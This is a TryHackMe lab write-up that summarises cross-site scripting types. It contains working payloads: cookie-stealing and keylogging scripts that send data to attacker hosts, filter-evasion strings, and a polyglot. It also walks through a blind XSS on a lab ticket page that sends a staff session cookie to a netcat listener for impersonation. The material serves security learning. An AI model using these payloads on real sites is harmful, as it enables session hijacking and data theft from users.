# TryHackMe: Intro to Cross-site Scripting Summary

Room URL: https://tryhackme.com/room/xss

Cross-Site Scripting (XSS) is a web security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. XSS attacks are classified into three main types:

1. **Reflected XSS**
2. **Stored (Persistent) XSS**
3. **DOM-based XSS**

---

**1. Reflected XSS (Non-Persistent)**

- **Definition**: The malicious script is reflected off a web server (e.g., in an error message, search result, or URL parameter) and executed in the victim's browser.
- **Exploitation**: Requires the victim to click a crafted link.
- **Impact**: Session hijacking, phishing, defacement.

**Example (Simple Reflected XSS)**

```html
http://vulnerable-site.com/search?q=<script>alert('XSS')</script>
```

- If the website reflects the **`q`** parameter without proper sanitization, the script executes.

**Real-World Case**

- **Trusted Source**: [OWASP - Reflected XSS](https://owasp.org/www-community/attacks/xss/#reflected-xss-attacks)

---

**2. Stored XSS (Persistent XSS)**

- **Definition**: The malicious script is permanently stored on the target server (e.g., in a database, comment section, or forum post).
- **Exploitation**: Executes when any user visits the infected page.
- **Impact**: Widespread attacks (e.g., stealing cookies, spreading malware).

**Example (Stored XSS in a Comment Field)**

```html
<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
```

- If a forum stores this comment, every visitor’s cookies are sent to the attacker.

**Real-World Case**

- **Trusted Source**: [PortSwigger - Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored)

---

**3. DOM-based XSS**

- **Definition**: The vulnerability exists in client-side JavaScript rather than server-side code. The attack manipulates the DOM (Document Object Model).
- **Exploitation**: No server interaction needed; executes when unsafe JavaScript modifies the DOM.
- **Impact**: Similar to Reflected XSS but harder to detect.

**Example (DOM XSS via URL Fragment)**

```html
http://vulnerable-site.com#<img src=x onerror=alert('XSS')>
```

- If JavaScript dynamically inserts the fragment (**`#`**) into the DOM unsafely, the payload executes.

**Real-World Case**

- **Trusted Source**: [OWASP - DOM XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS)

---

## XSS Payloads

```jsx
// Proof of Concept:
<script>alert('XSS');</script>

// Session Stealing: 
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>

//Key logger
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>

//Business Logic:
<script>user.changeEmail('attacker@hacker.thm');</script>

```

`<script>alert('XSS');</script>`

- Simple XSS :  `<script>alert('THM');</script>`
- escaping  input tag:  `"><script>alert('THM');</script>`
- escaping HTML tag: `</textarea><script>alert('THM');</script>`
- escaping JavaScript code: `';alert('THM');//`
- escaping script word filtering: `<sscriptcript>alert('THM');</sscriptcript>`
- escaping `<>` tag filtering inside `img` tag:  `/images/cat.jpg" onload="alert('THM');`
- Polyglots: An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one.  `jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e`

## Testing Blind XSS

Testing blind XSS on the  **Support Tickets** tab. 

First, create a simple ticket to check on how tickets are reflected on the page by viewing the page source

<img width="1276" height="722" alt="Screenshot 2025-07-31 145121" src="https://github.com/user-attachments/assets/28a99a79-b6c5-4938-a1bc-b45a7d6fece8" />


```jsx
            <div class="panel panel-default" style="margin:25px">
                <div class="panel-heading">Ticket Information</div>
                <div class="panel-body">
                    <div><label>Status:</label> Open</div>
                    <div><label>Ticket Id:</label> 8</div>
                    <div><label>Ticket Subject:</label> testing xss</div>
                    <div><label>Ticket Created:</label> 31/07/2025 11:46</div>
                    <div><label>Ticket Contents:</label></div>
                    <div><textarea class="form-control">test</textarea></div>
                </div>
            </div>
```

The **Ticket Contents** are placed inside a textarea tag. 

Escaping textarea tag: create another ticket and put this text inside Ticket Content

`</textarea>test`

<img width="1267" height="586" alt="Screenshot 2025-07-31 145612" src="https://github.com/user-attachments/assets/18325aa0-16cc-485d-9f96-510c37e6e297" />


page source

```jsx

            <div class="panel panel-default" style="margin:25px">
                <div class="panel-heading">Ticket Information</div>
                <div class="panel-body">
                    <div><label>Status:</label> Open</div>
                    <div><label>Ticket Id:</label> 9</div>
                    <div><label>Ticket Subject:</label> escaping textarea tag</div>
                    <div><label>Ticket Created:</label> 31/07/2025 11:55</div>
                    <div><label>Ticket Contents:</label></div>
                    <div><textarea class="form-control"></textarea>test</textarea></div>
                </div>
            </div>

```

Now that we have confirmed a blind XSS vulnerability, we can exploit it to **steal cookies.**

**Exploiting Blind XSS to hijack login sessions:** Create a new ticket with a payload to extract the user’s cookie and exfiltrate it to our listening server. Change the IP and port to your listening server.

```jsx
</textarea><script>fetch('http://10.10.153.151:9001?cookie=' + btoa(document.cookie) );</script>

```

<img width="1294" height="682" alt="Screenshot 2025-07-31 150901" src="https://github.com/user-attachments/assets/52d43e4c-8b64-4451-8aa1-40a72b3e489b" />


Set up the listening port to receive the information. 

```bash
root@ip-10-10-153-151:~# nc -lnvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.51.18 51786
GET /?cookie=c3RhZmYtc2Vzc2lvbj00QUIzMDVFNTU5NTUxOTc2OTNGMDFENkY4RkQyRDMyMQ== HTTP/1.1
Host: 10.10.153.151:9001
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/89.0.4389.72 Safari/537.36
Accept: */*
Origin: http://172.17.0.1
Referer: http://172.17.0.1/
Accept-Encoding: gzip, deflate
Accept-Language: en-US

root@ip-10-10-153-151:~# echo "c3RhZmYtc2Vzc2lvbj00QUIzMDVFNTU5NTUxOTc2OTNGMDFENkY4RkQyRDMyMQ==" | base64 -d
staff-session=4AB305E55955197693F01D6F8FD2D321
```

We can use the obtained cookie to impersonate the victim.

## Reference:

- [OWASP XSS Guide](https://owasp.org/www-community/attacks/xss/)
- [PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting)
- [XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
